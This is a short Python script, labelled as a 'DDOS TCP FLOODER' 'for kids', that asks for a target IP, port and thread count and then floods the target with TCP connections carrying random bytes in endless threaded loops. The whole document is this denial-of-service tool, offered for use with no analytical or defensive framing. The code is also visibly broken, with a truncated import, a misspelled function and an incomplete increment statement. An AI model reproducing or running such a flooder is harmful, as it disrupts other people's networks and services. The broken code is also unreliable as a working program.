# Flod
# DDOS TCP FLOODER
# FOR KIDS

import socket
import random
import threadi

ip = str(input('[+] Target: '))
port = int(input('[+] Port: '))
pack = int(intput('[+] Pack/s:  '))
thread = int(input('[+] Thread   '))


def start():
      hh = random._urandom(10)
      xx = int(0)
      while True:
           try:
                s = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(hh)
                xx +=
                print(' Attacking '+ip+'  |  sent: '+str(xx))
         except:
                 s.close()
                 print('Done')
                 
for x in range(thread):
      thread = threading.Thread(target=start)
      thread.start()
      
# DONE!
      
